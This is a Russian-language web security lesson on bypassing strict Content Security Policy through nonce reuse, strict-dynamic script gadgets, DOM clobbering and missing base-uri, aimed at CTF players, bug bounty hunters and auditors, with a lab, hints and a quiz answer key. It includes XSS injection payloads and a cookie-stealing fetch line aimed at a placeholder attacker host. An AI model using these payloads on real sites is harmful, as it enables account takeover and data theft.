---
id: web-csp-advanced
title: "CSP advanced: nonce reuse, strict-dynamic, base-uri, script gadgets"
category: web
parent: web-dom-clobbering
difficulty: hard
order: 1
tags: [csp, xss, nonce, strict-dynamic, base-uri, script-gadget]
prerequisites: [web-csp-bypass, web-xss, web-dom-clobbering]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как обходят современный CSP: переиспользование nonce, обход strict-dynamic через script gadgets, base-uri и доверие к CDN."
lab:
  kind: shell
  title: "Практика: CSP advanced — nonce reuse"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - 'Сними заголовки: curl -sI https://shop.local/ — увидишь script-src с nonce.'
    - 'С nonce и strict-dynamic инлайн-скрипт с ЭТИМ nonce разрешён.'
    - 'Nonce переиспользуется в отражённом параметре q.'
    - 'Вставь <script nonce=abc123> и fetch /admin/flag — сохрани результат в found.txt.'
---

## Задача

На `https://target.local` стоит **строгий CSP** — не `'unsafe-inline'`, а `nonce` и `strict-dynamic`. Мы нашли HTML-инъекцию, но браузер отказывается исполнять наш `<script>`. Значит, базовый обход (`'unsafe-inline'`, JSONP, доверенный CDN) не подходит.

Этот урок — про реальные техники против «правильного» CSP: переиспользование nonce, обход `strict-dynamic` через **script gadgets**, `base-uri` и доверие к CDN.

## Данные, с которыми работаем

Заголовок с целевого хоста:

```
Content-Security-Policy:
  script-src 'nonce-rAnd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

И HTML-инъекция в параметре `?q=`.

## Теория: как устроен строгий CSP

- **nonce** — случайная строка, которую сервер подставляет в каждый `<script nonce="...">`. Инлайн-скрипт без правильного nonce не выполнится.
- **`strict-dynamic`** — доверяет скриптам, загруженным **из уже доверенного** скрипта (не по списку хостов).
- **hash** — `'sha256-...'` для конкретного инлайн-скрипта.
- **`base-uri 'none'`** — запрещает `<base>` (защита от переадресации относительных URL).
- **Trusted Types** — заставляет использовать безопасные API вместо `innerHTML` (`web-trusted-types-bypass`).

## Шаг 1: снять и разложить CSP

```bash
$ curl -s -I https://target.local/ | grep -i 'content-security-policy'
content-security-policy: script-src 'nonce-rAnd0m' 'strict-dynamic'; base-uri 'none'; object-src 'none'
```

**Условие ветвления:** есть `'unsafe-inline'`/`'unsafe-eval'`/`*`/`https:` в `script-src` → базовый обход. Есть `nonce`/`strict-dynamic` → идём по этому уроку.

## Шаг 2: nonce — уникальность и кэш

Nonce обязан быть **уникальным на каждый ответ**. Проверяем:

```bash
$ for i in 1 2 3; do
    curl -s https://target.local/ | grep -oE 'nonce-[A-Za-z0-9+/=]+' | head -1
  done
nonce-abc123
nonce-abc123
nonce-abc123            # nonce не меняется -> переиспользуется
```

Теперь проверяем, не кэшируется ли ответ с nonce:

```bash
$ curl -s -I https://target.local/ | grep -iE 'cache-control|x-cache|age|cf-cache'
cache-control: public, max-age=60
x-cache: MISS           # ответ кэшируемый -> nonce станет общим для всех
```

Если nonce одинаков и/или кэшируется — мы знаем его и можем вставить свой `<script nonce="abc123">`.

## Шаг 3: base-uri

Если `base-uri` **не задан**, HTML-инъекция `<base href="https://attacker.example/">` перенаправит относительные скрипты:

```html
<base href="https://attacker.example/">
```

Теперь `<script src="/static/app.js">` резолвится как `https://attacker.example/static/app.js` → ты контролируешь код. В нашем примере `base-uri 'none'` стоит, так что этот вектор закрыт — идём дальше.

## Шаг 4: strict-dynamic → script gadgets

При `strict-dynamic` бесполезно искать «доверенный CDN». Ищем **gadgets** — существующий код, который берёт данные из DOM и передаёт в исполнение:

```bash
$ curl -s https://target.local/app.js -o app.js
$ grep -nE 'createElement\(.script|document\.write|innerHTML|\.src *=' app.js | head
42:  const el = document.getElementById('banner');
43:  el.innerHTML = window.bannerHtml;
```

Найден gadget: доверенный скрипт читает `window.bannerHtml` и кладёт в `innerHTML`. Комбинируем с **DOM clobbering** — подменяем `window.bannerHtml` через HTML-инъекцию:

```html
<form id="bannerHtml"><input name="src" value="//attacker.example/x.js"></form>
```

Если gadget создаёт `<script src>`, `strict-dynamic` разрешит загрузку (инициатор — доверенный скрипт). Inline-обработчик (`onerror`) при `strict-dynamic` тоже ограничен, поэтому цель — заставить gadget создать именно `<script src>`.

## Шаг 5: Trusted Types и DOM clobbering

**Trusted Types** (`require-trusted-types-for 'script'`) заставляет использовать `TrustedHTML` вместо строк в опасных sink'ах. Обходы:

- **DOM clobbering:** подмена значений, попадающих в `TrustedHTML`-sink доверенного кода, через `<form id=...>`, `<img name=...>`.
- **Политика `default` с санитайзером:** если она делает `TrustedHTML` из строки, возможен mXSS (`web-mxss`).
- **Утечка nonce:** иногда nonce доступен в DOM.

```html
<form id="config"><input name="url" value="https://attacker.example/x.js"></form>
```

Доверенный скрипт читает `window.config.url` → `config` — это HTMLFormElement, `config.url` — твой input → скрипт грузится.

## Полный прогон: nonce reuse → XSS

```bash
# 1. nonce не меняется между запросами
$ for i in 1 2 3; do curl -s https://target.local/ | grep -oE 'nonce-[A-Za-z0-9+/=]+' | head -1; done
nonce-abc123
nonce-abc123
nonce-abc123

# 2. ответ кэшируется -> nonce общий
$ curl -s -I https://target.local/ | grep -i cache-control
cache-control: public, max-age=60

# 3. вставляем свой скрипт с известным nonce через HTML-инъекцию
$ curl -s 'https://target.local/?q=<script nonce="abc123">alert(document.domain)</script>'
# в ответе: <script nonce="abc123">alert(document.domain)</script>
# браузер: CSP пропускает (nonce "легитимен") -> alert выполняется
```

Шаг 4 — эскалация до кражи (`fetch('//attacker/?c='+document.cookie)`). В отчёте: заголовок CSP, значение nonce, доказательство исполнения.

## Reference: техники обхода строгого CSP

| Слабое место | Техника обхода |
|--------------|----------------|
| Кэшируемый/статичный nonce | `<script nonce=known>` |
| nonce утекает в DOM/CSS | прочитать и подставить |
| `strict-dynamic` | script gadget / DOM clobbering |
| Нет `base-uri` | `<base href="//attacker/">` |
| Нет `object-src` | `<object data="data:text/html,...">` |
| Доверенный CDN | JSONP / уязвимая библиотека |
| `'unsafe-eval'` | `eval`/`Function`/`setTimeout('...')` |
| Нет `require-trusted-types` | `innerHTML` с gadget |
| CSP в `<meta>` | не покрывает `frame-ancestors` |
| `connect-src` не задан | `fetch` на attacker для эксфильтрации |

## Если не сработало — пробуй это

- **Искал только whitelist-CDN.** При `strict-dynamic` это тупик — работай с gadgets.
- **Nonce уникален и не кэшируется.** Переходи к gadgets/`base-uri`/`object-src`.
- **`base-uri 'none'`.** Вектор `<base>` закрыт — ищи gadget.
- **Нет gadget с `createElement('script')`.** Ищи `document.write`, `location`, `eval`, CSTI.
- **CSP в `<meta>`.** Проверь, нет ли enforcing-заголовка, и можно ли вставить свой `<meta>` раньше.

## Чек-лист аудита CSP

1. Есть ли **enforcing**-заголовок (не только `Report-Only`)?
2. `script-src`: есть `'unsafe-inline'`/`'unsafe-eval'`/`*`/`data:`/`https:`?
3. `nonce`/`hash`: уникальны ли, кэшируются ли, утекают ли в DOM?
4. `strict-dynamic`: есть ли gadgets на странице?
5. `base-uri`, `object-src`, `frame-ancestors`, `form-action` заданы?
6. `require-trusted-types-for`: включён ли?
7. `connect-src`/`img-src`: можно ли эксфильтрировать?
8. Доверенные домены: есть ли JSONP / уязвимые библиотеки / открытые редиректы?

`Content-Security-Policy-Report-Only` ничего не блокирует — только логирует. Если видишь только report-only, XSS не ограничен; проверь, нет ли дублирующего enforcing-заголовка. CSP в `<meta>` не покрывает `frame-ancestors` и его можно попытаться переопределить своим `<meta>` раньше.

## Почему строгий CSP не «непробиваем», а меняет поверхность

Строгий CSP производит обманчивое впечатление: кажется, что раз `'unsafe-inline'` выключен, а nonce уникален, то XSS невозможен в принципе. Это не так. CSP — это не фильтр содержимого, а **политика исполнения**: браузер решает, какой код разрешено выполнить, но не проверяет, что код безопасен. Пока на странице есть хоть один доверенный скрипт, есть и путь к исполнению — вопрос лишь в том, насколько он длинный.

Разберём три уровня, на которых ломается строгая политика. Первый — сам nonce. Если сервер генерирует его не на каждый ответ, а кэширует страницу, значение становится предсказуемым. Тогда `<script nonce="known">` — это уже доверенный скрипт с точки зрения браузера. Ошибка здесь не в CSP, а в реализации: nonce обязан быть уникальным для каждого ответа и не кэшироваться.

Второй уровень — `strict-dynamic`. Он специально устроен так, чтобы доверять скриптам, которые загрузил другой доверенный скрипт. Это удобно для современных приложений, но создаёт класс атак через **script gadgets**: любой существующий код, который берёт значение из DOM и передаёт его в исполнение, становится «мостиком». Своего скрипта у тебя нет — но есть чужой, доверенный, который сам загрузит твой URL. Комбинация с DOM clobbering позволяет подсунуть ему нужное значение через HTML-инъекцию.

Третий уровень — директивы, которых не хватает. `base-uri` не задан — и `<base href="//attacker/">` перенаправляет относительные скрипты на твой хост. `object-src` не задан — и `<object>` встраивает чужой контент. `connect-src` не задан — и эксфильтрация данных не ограничена. Список защитных директив длинный, и отсутствие любой из них — это дыра.

Отсюда практический вывод: аудит CSP — это не проверка «есть ли nonce», а проверка **всей конфигурации** и поиск gadget'ов на странице. Строгая политика сужает классы атак, но не отменяет их; она просто переносит центр тяжести с тривиального `<script>` на цепочки «gadget + clobbering + отсутствующая директива».

И не забывай фиксировать точную конфигурацию: директивы, значения nonce, кэш-заголовки. Обход воспроизводим только тогда, когда известна политика, против которой он сработал, — иначе через день ты не сможешь отличить настоящую слабость от случайной ошибки в запросе.

## Что мы теперь знаем

- Строгий CSP держится на nonce, `strict-dynamic`, `base-uri`, Trusted Types.
- Переиспользуемый/кэшируемый nonce = обход (`<script nonce=known>`).
- Отсутствие `base-uri` → перехват относительных скриптов через `<base>`.
- При `strict-dynamic` обход идёт через script gadgets + DOM clobbering.
- Trusted Types обходится через clobbering и mXSS-санитайзеры.

## На что смотреть дальше

- **CSP Evaluator.** Быстро показывает слабые директивы.
- **Enforcing vs report-only.** Report-only ничего не блокирует.
- **`connect-src`/`img-src`.** Определяют, как эксфильтрировать данные.
- **Комбинируй с HTML-инъекцией.** CSP — про исполнение, а не про разметку.
- **Фикс в отчёте.** Предлагай уникальный nonce + `base-uri`/`object-src`/Trusted Types.

## Квиз

Проверь себя.

```quiz
- question: "Что делает strict-dynamic?"
  options:
    - "Доверяет скриптам, загруженным из уже доверенного скрипта"
    - "Запрещает все скрипты"
    - "Включает CORS"
    - "Шифрует JS"
  answer: 0
  explanation: "Динамическая загрузка разрешена, если инициатор доверенный."
- question: "Почему переиспользуемый/кэшируемый nonce опасен?"
  options:
    - "Он одинаков для всех — атакующий может вставить свой script с этим nonce"
    - "Он ускоряет сайт"
    - "Он отключает HTTPS"
    - "Он меняет cookie"
  answer: 0
  explanation: "Nonce обязан быть уникальным на каждый ответ."
- question: "Какой директивы не хватает, если base href='https://attacker/' перехватывает скрипты?"
  options:
    - "base-uri"
    - "form-action"
    - "img-src"
    - "connect-src"
  answer: 0
  explanation: "base-uri 'none'/'self' запрещает подмену базы."
- question: "Что такое script gadget?"
  options:
    - "Существующий на странице код, передающий данные из DOM в исполнение"
    - "Новый script"
    - "Внешний CDN"
    - "Cookie"
  answer: 0
  explanation: "Gadget обходит strict-dynamic, т.к. инициатор уже доверенный."
- question: "Чем DOM clobbering помогает обойти CSP?"
  options:
    - "Подменяет данные, которые доверенный скрипт передаёт в sink"
    - "Отключает CSP"
    - "Загружает CDN"
    - "Меняет nonce"
  answer: 0
  explanation: "HTML-инъекция плюс gadget = исполнение без своего скрипта."
```

## Куда дальше

Дальше (`web-trusted-types-bypass`) мы разберём Trusted Types подробно — как обходят строгую защиту от DOM-XSS. А пока главное запомни: строгий CSP обходится не «доверенным CDN», а слабостями конфигурации — nonce, `base-uri` и gadgets.

## Где пригодится

- **CTF (Web):** задачи с «непробиваемым» CSP и скрытым gadget'ом.
- **Bug bounty:** обход CSP — самостоятельный класс, часто повышает severity XSS.
- **Пентест:** аудит CSP-конфигураций и доверенных скриптов.
- **Работа (AppSec/Dev):** корректный CSP (уникальный nonce, `base-uri`, `object-src`, Trusted Types).
